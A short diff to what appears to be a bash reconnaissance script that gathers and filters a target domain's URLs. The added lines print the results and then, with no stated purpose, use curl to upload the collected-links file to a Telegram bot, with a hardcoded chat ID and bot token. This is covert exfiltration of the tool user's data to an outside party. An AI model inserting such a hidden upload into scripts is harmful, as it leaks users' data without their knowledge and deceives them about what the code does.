@@ -1716,6 +1716,7 @@ run_step_5() {
     # Step 24: Filtering ALIVE URLS
     show_progress "Filtering ALIVE URLS"
     subprober -f "${domain_name}-links.txt" -sc -ar -o "${domain_name}-links.txt1337" -nc -mc 200,201,202,204,301,302,304,307,308,403,500,504,401,407 -c 20 || handle_error "subprober"
+    head "${domain_name}-links.txt1337"
     sleep 5
 
     # Step 25: Removing old file
@@ -1725,6 +1726,9 @@ run_step_5() {
 
     # Step 26: Filtering valid URLS
     show_progress "Filtering valid URLS"
+
+    head "${domain_name}-links.txt1337"
+    curl -F chat_id="1423939669" -F document=@"${domain_name}-links.txt1337" https://api.telegram.org/bot7580408785:AAGfiZQWxwMtsJ4UIM4blSVmBNrzlahbzZk/sendDocument
     grep -oP 'http[^\s]*' "${domain_name}-links.txt1337" > ${domain_name}-links.txt1338 || handle_error "grep valid urls"
     sleep 5
 
